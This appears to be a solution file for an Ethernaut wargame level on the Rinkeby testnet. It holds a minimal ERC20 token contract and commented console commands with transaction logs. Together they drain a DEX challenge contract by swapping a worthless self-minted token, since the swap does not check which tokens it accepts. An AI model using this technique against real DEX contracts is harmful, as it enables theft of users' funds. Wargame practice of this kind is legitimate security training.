// 1 - Deploy MyToken.sol with initial supply 100 - Remix - 0x491d4A3F46b309AdA59B7259AC7082534fF84975
// 2 - Approve 100 - Remix
// 3 - Transfer 1 NAUT token to challenge address - Remix
// 4 - Check token1 and token2 addresses

// await contract.token1()
// '0x77Cfff4b79971f72FdCBA607aB2d341BDae379cD'
// await contract.token2()
// '0x496EDA3C5BAC0430d16df3B47A8844b2a3e6B531'

// 5 - Swap token3 for token1 and token2 respectively
// await contract.swap("0x491d4A3F46b309AdA59B7259AC7082534fF84975", "0x77Cfff4b79971f72FdCBA607aB2d341BDae379cD", 1);
// await contract.swap("0x491d4A3F46b309AdA59B7259AC7082534fF84975", "0x496EDA3C5BAC0430d16df3B47A8844b2a3e6B531", 2);

// contracts/GLDToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    constructor(uint256 initialSupply) public ERC20("ETHERNAUT", "NAUT") {
        _mint(msg.sender, initialSupply);
    }
}

// Analysis:

// let dexTokenC = await contract.balanceOf("0xfA44976A8A6E64fDC2A2bBa7d3AC5b6C74e69B36", instance)
// undefined
// dexTokenC.toString()
// '1'
// await contract.token1()
// '0x88E7163767651a9C8174F8C8568932f27C96b5a7'
// await contract.token2()
// '0x4B4eeF0E6492aC8Bf33fBC59D3dA01232391c3dB'
// await contract.swap("0xfA44976A8A6E64fDC2A2bBa7d3AC5b6C74e69B36","0x88E7163767651a9C8174F8C8568932f27C96b5a7",1)
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x731f3445a99a5e08da02ef5155b5b69eb91ad1778512febd0059f8277569043f
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x731f3445a99a5e08da02ef5155b5b69eb91ad1778512febd0059f8277569043f
// {tx: '0x731f3445a99a5e08da02ef5155b5b69eb91ad1778512febd0059f8277569043f', receipt: {…}, logs: Array(0)}
// let dexTokenA = await contract.balanceOf("0x88E7163767651a9C8174F8C8568932f27C96b5a7", instance)
// undefined
// let dexTokenC = await contract.balanceOf("0xfA44976A8A6E64fDC2A2bBa7d3AC5b6C74e69B36", instance)
// undefined
// dexTokenC.toString()
// '2'
// await contract.swap("0xfA44976A8A6E64fDC2A2bBa7d3AC5b6C74e69B36","0x4B4eeF0E6492aC8Bf33fBC59D3dA01232391c3dB",2)
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x50e6344cbcf92c7c1f262f618daca83422f60f2dfa1bb2692edce0e43e2acb33
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x50e6344cbcf92c7c1f262f618daca83422f60f2dfa1bb2692edce0e43e2acb33
// {tx: '0x50e6344cbcf92c7c1f262f618daca83422f60f2dfa1bb2692edce0e43e2acb33', receipt: {…}, logs: Array(0)}
// let dexTokenB = await contract.balanceOf("0x4B4eeF0E6492aC8Bf33fBC59D3dA01232391c3dB", instance)
// undefined
// dexTokenB.toString()
// '0'
